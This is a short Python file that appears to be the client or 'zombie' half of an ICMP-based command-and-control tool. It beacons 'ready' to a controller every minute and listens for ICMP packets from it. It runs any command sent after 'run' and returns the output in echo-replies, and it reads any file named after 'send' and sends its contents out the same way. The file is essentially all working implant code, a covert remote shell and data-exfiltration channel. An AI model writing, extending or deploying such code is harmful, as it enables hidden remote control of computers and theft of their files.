
from icmp_c2_modules import *

server_adr = "127.0.0.1"
zombie_msg = "ready"
ICMP_RESPONSE = "icmp[0]=0"

def beacon_func(addr,data):
    while 1:
        pkt_send(dest=server_adr,data=zombie_msg)
        print("send beacon")
        time.sleep(60)
    
#pkt_send(dest=server_adr,data="waiting")

def parse_packet(packet):
    if packet[IP].src == server_adr and Raw in packet:
        data_recieved = extract_data(packet)
        if data_recieved.lower().startswith('run'):
            output = RunCommand(data_recieved[4:])
            pkt_send(server_adr,output,"echo-reply")
        elif data_recieved.lower().startswith('send'):
            output = read_file(data_recieved[5:])
            pkt_send(server_adr,output,"echo-reply")
            
            
# Start sniffing packets

def client_listen():
    sniff_pkt(ICMP_RESPONSE,parse_packet,cnt=1)

